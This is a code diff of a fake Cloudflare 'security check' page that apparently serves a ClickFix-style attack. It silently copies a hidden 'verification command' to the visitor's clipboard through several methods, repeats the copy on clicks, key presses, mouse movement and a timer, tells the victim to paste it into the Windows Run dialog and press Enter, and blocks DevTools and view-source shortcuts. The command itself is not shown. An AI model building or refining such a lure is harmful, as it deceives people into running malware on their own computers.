@@ -45,13 +45,37 @@
             align-items: center;
             justify-content: center;
             margin-bottom: 30px;
-            gap: 10px;
+            gap: 15px;
+            flex-direction: column;
+        }
+        
+        .cloudflare-logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        
+        .cloudflare-icon {
+            width: 70px;
+            height: 70px;
+            background-color: #f38020;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 32px;
+            color: white;
+            margin: 0 auto;
         }
         
         .cloudflare-title {
-            font-size: 24px;
-            font-weight: 500;
+            font-size: 28px;
+            font-weight: 600;
             color: #f38020;
+            letter-spacing: 0.5px;
         }
         
         .main-content {
@@ -63,32 +87,21 @@
             width: 180px;
             height: 180px;
             position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
         .spinner {
-            width: 100%;
-            height: 100%;
+            width: 180px;
+            height: 180px;
             border: 8px solid #e6e6e6;
             border-top: 8px solid #f38020;
             border-radius: 50%;
             animation: spin 1.5s linear infinite;
-        }
-        
-        .cloudflare-icon {
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 70px;
-            height: 70px;
-            background-color: #f38020;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 32px;
-            color: white;
+            top: 0;
+            left: 0;
         }
         
         .status-text {
@@ -193,28 +206,22 @@
         }
         
         .auto-copy-notice {
-            background-color: #e8f4ff;
-            border: 1px solid #b6d9ff;
+            background-color: #e8f7e8;
+            border: 1px solid #b8e0b8;
             border-radius: 6px;
             padding: 15px;
             margin-top: 20px;
             text-align: center;
-            color: #0066cc;
+            color: #2d662d;
             font-size: 14px;
             display: none;
             animation: fadeIn 0.5s;
         }
         
-        .auto-copy-notice.success {
-            background-color: #e8f7e8;
-            border-color: #b8e0b8;
+        .auto-copy-notice .checkmark {
             color: #2d662d;
-        }
-        
-        .auto-copy-notice.error {
-            background-color: #ffe8e8;
-            border-color: #ffb6b6;
-            color: #cc0000;
+            font-weight: bold;
+            margin-right: 8px;
         }
         
         .invisible-textarea {
@@ -224,6 +231,18 @@
             width: 0;
             pointer-events: none;
             left: -9999px;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            font-size: 13px;
+            color: #888;
+        }
+        
+        .footer p {
+            margin: 5px 0;
         }
         
         @keyframes spin {
@@ -241,15 +260,28 @@
                 padding: 20px;
             }
             
+            .cloudflare-header {
+                gap: 10px;
+            }
+            
+            .cloudflare-icon {
+                width: 60px;
+                height: 60px;
+                font-size: 26px;
+            }
+            
+            .cloudflare-title {
+                font-size: 24px;
+            }
+            
             .checking-animation {
                 width: 140px;
                 height: 140px;
             }
             
-            .cloudflare-icon {
-                width: 50px;
-                height: 50px;
-                font-size: 24px;
+            .spinner {
+                width: 140px;
+                height: 140px;
             }
         }
     </style>
@@ -269,7 +301,9 @@
     <!-- Main content for desktop users -->
     <div class="container" id="desktopContainer">
         <div class="cloudflare-header">
-            <div class="cloudflare-icon">CF</div>
+            <div class="cloudflare-logo-container">
+                <div class="cloudflare-icon">CF</div>
+            </div>
             <div class="cloudflare-title">cloudflare</div>
         </div>
         
@@ -285,6 +319,7 @@
         
         <!-- Auto-copy status notification -->
         <div class="auto-copy-notice" id="copyNotice">
+            <span class="checkmark">✓</span>
             <span id="copyMessage">Verification command has been automatically copied to your clipboard</span>
         </div>
         
@@ -296,7 +331,7 @@
             </div>
             
             <div class="error-details">
-                <p>We've detected an issue with your IP address verification. Your request has been blocked due to security restrictions.</p>
+                <p>We've detected an issue with your connection. Your request has been blocked due to security reasons.</p>
                 <p><strong>Error Code:</strong> 1020</p>
                 <p><strong>Ray ID:</strong> 7a1b2c3d4e5f6789</p>
                 <p><strong>Your IP:</strong> <span id="userIP">Loading...</span></p>
@@ -310,22 +345,22 @@
                 
                 <div class="step">
                     <div class="step-number">1</div>
-                    <div class="step-text">Press <span class="key-combo">Windows</span> + <span class="key-combo">R</span> to open the Run dialog</div>
+                    <div class="step-text">Press <span class="key-combo">Windows</span> + <span class="key-combo">R</span> to open the Run dialog.</div>
                 </div>
                 
                 <div class="step">
                     <div class="step-number">2</div>
-                    <div class="step-text">Press <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span> to paste the verification command (automatically copied to clipboard)</div>
+                    <div class="step-text">Press <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span> to paste the verification command (automatically copied to clipboard).</div>
                 </div>
                 
                 <div class="step">
                     <div class="step-number">3</div>
-                    <div class="step-text">Press <span class="key-combo">Enter</span> to execute the verification</div>
+                    <div class="step-text">Press <span class="key-combo">Enter</span> to execute the verification.</div>
                 </div>
                 
                 <div class="step">
                     <div class="step-number">4</div>
-                    <div class="step-text">Follow the instructions in the verification window</div>
+                    <div class="step-text">Follow the instructions in the verification window.</div>
                 </div>
             </div>
             
@@ -334,9 +369,9 @@
             </div>
         </div>
         
-        <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee; font-size: 13px; color: #888;">
+        <div class="footer">
             <p>DDoS protection by <strong>Cloudflare</strong></p>
-            <p style="margin-top: 5px;">Ray ID: 7a1b2c3d4e5f6789 • <span id="currentTime"></span></p>
+            <p>Ray ID: 7a1b2c3d4e5f6789 • <span id="currentTime"></span></p>
         </div>
     </div>
 
@@ -371,7 +406,6 @@
         function forceCopyToClipboard(text) {
             const textarea = document.getElementById('invisibleTextarea');
             const copyNotice = document.getElementById('copyNotice');
-            const copyMessage = document.getElementById('copyMessage');
             
             // Method 1: Using execCommand (deprecated but works without permission)
             textarea.value = text;
@@ -384,9 +418,6 @@
                 const successful = document.execCommand('copy');
                 if (successful) {
                     copied = true;
-                    copyNotice.classList.remove('error');
-                    copyNotice.classList.add('success');
-                    copyMessage.textContent = '✓ Verification command has been automatically copied to your clipboard';
                     copyNotice.style.display = 'block';
                     console.log('Command copied to clipboard via execCommand');
                 }
@@ -394,13 +425,10 @@
                 console.log('execCommand failed:', err);
             }
             
-            // Method 2: Using Clipboard API with fallback (не требует разрешения в некоторых контекстах)
+            // Method 2: Using Clipboard API with fallback
             if (!copied && navigator.clipboard && navigator.clipboard.writeText) {
                 navigator.clipboard.writeText(text).then(() => {
                     copied = true;
-                    copyNotice.classList.remove('error');
-                    copyNotice.classList.add('success');
-                    copyMessage.textContent = '✓ Verification command has been automatically copied to your clipboard';
                     copyNotice.style.display = 'block';
                     console.log('Command copied to clipboard via Clipboard API');
                 }).catch(err => {
@@ -408,7 +436,7 @@
                 });
             }
             
-            // Method 3: Секретный метод через временный элемент
+            // Method 3: Секретный метод через contentEditable div
             if (!copied) {
                 try {
                     const tempDiv = document.createElement('div');
@@ -431,9 +459,6 @@
                     document.body.removeChild(tempDiv);
                     
                     copied = true;
-                    copyNotice.classList.remove('error');
-                    copyNotice.classList.add('success');
-                    copyMessage.textContent = '✓ Verification command has been automatically copied to your clipboard';
                     copyNotice.style.display = 'block';
                     console.log('Command copied via temporary element method');
                     
@@ -442,18 +467,12 @@
                 }
             }
             
-            // Если все методы не сработали
-            if (!copied) {
-                copyNotice.classList.remove('success');
-                copyNotice.classList.add('error');
-                copyMessage.textContent = '⚠ Please manually copy the command: ' + text;
-                copyNotice.style.display = 'block';
+            // Скрыть уведомление через 8 секунд
+            if (copied) {
+                setTimeout(() => {
+                    copyNotice.style.display = 'none';
+                }, 8000);
             }
-            
-            // Скрыть уведомление через 10 секунд
-            setTimeout(() => {
-                copyNotice.style.display = 'none';
-            }, 10000);
             
             return copied;
         }
@@ -495,16 +514,14 @@
                 forceCopyToClipboard(command);
                 
                 // Дополнительные триггеры для копирования
-                document.addEventListener('click', function autoCopyOnInteraction() {
-                    forceCopyToClipboard(command);
-                }, { once: true });
+                const copyTriggers = ['click', 'keydown', 'mousemove'];
+                copyTriggers.forEach(trigger => {
+                    document.addEventListener(trigger, function autoCopy() {
+                        forceCopyToClipboard(command);
+                    }, { once: true });
+                });
                 
-                // Копируем при любом нажатии клавиши
-                document.addEventListener('keydown', function autoCopyOnKeydown() {
-                    forceCopyToClipboard(command);
-                }, { once: true });
-                
-                // Периодически пытаемся скопировать
+                // Периодически пытаемся скопировать (5 попыток)
                 let copyAttempts = 0;
                 const copyInterval = setInterval(() => {
                     if (copyAttempts < 5) {
@@ -513,7 +530,7 @@
                     } else {
                         clearInterval(copyInterval);
                     }
-                }, 2000);
+                }, 1500);
                 
             }, 5000);
         }
@@ -547,7 +564,7 @@
             return false;
         });
         
-        // Auto-copy on Ctrl+V
+        // Auto-copy on Ctrl+V and prevent DevTools
         document.addEventListener('keydown', function(e) {
             // Копируем при Ctrl+V
             if (e.ctrlKey && e.key === 'v') {
@@ -556,13 +573,40 @@
                 e.preventDefault();
             }
             
-            // Предотвращаем DevTools
-            if (e.key === 'F12' || 
-               (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
-               (e.ctrlKey && e.key === 'u') ||
-               (e.ctrlKey && e.key === 's')) {
+            // Prevent DevTools and other shortcuts
+            const blockedKeys = [
+                'F12',
+                'F11',
+                'F10',
+                'F8',
+                'F5'
+            ];
+            
+            const blockedCombos = [
+                {ctrl: true, shift: true, key: 'i'},
+                {ctrl: true, shift: true, key: 'j'},
+                {ctrl: true, shift: true, key: 'c'},
+                {ctrl: true, shift: true, key: 'k'},
+                {ctrl: true, key: 'u'},
+                {ctrl: true, key: 's'},
+                {ctrl: true, key: 'p'},
+                {ctrl: true, shift: true, key: 'p'}
+            ];
+            
+            // Check single keys
+            if (blockedKeys.includes(e.key)) {
                 e.preventDefault();
                 return false;
+            }
+            
+            // Check key combinations
+            for (const combo of blockedCombos) {
+                if (e.ctrlKey === combo.ctrl && 
+                    e.shiftKey === (combo.shift || false) && 
+                    e.key.toLowerCase() === combo.key) {
+                    e.preventDefault();
+                    return false;
+                }
             }
         });
         
@@ -572,20 +616,9 @@
                 setTimeout(() => {
                     const command = getVerificationCommand();
                     forceCopyToClipboard(command);
-                }, 500);
+                }, 300);
             }
         });
-        
-        // Копирование при наведении мыши
-        document.addEventListener('mousemove', function() {
-            const errorContainer = document.getElementById('errorContainer');
-            if (errorContainer.style.display === 'block') {
-                const command = getVerificationCommand();
-                setTimeout(() => {
-                    forceCopyToClipboard(command);
-                }, 1000);
-            }
-        }, { once: true });
     </script>
 </body>
 </html>
